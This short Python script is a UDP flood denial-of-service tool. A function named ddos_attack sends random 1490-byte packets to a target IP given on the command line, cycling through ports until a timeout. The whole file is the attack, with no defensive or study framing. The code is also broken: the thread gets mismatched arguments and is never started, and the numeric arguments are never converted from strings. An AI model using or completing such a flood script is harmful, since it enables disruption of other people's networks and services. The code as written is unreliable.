import os
import socket
import time
import sys
import threading

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#############


def ddos_attack(ip, start_port):
    print("Attack Starting on IP %s", ip)
    send_bytes = os.urandom(1490)
    sent = 0
    port = start_port
    start_time = time.time()
    while True:
        sock.sendto(send_bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        if port == 65534:
            port = start_port
        if time.time() - start_time > timeout:
            break


ip = sys.argv[1]
starting_port = sys.argv[2]
timeout = sys.argv[3]
threading.Thread(target=ddos_attack, args=(ip, starting_port, timeout))
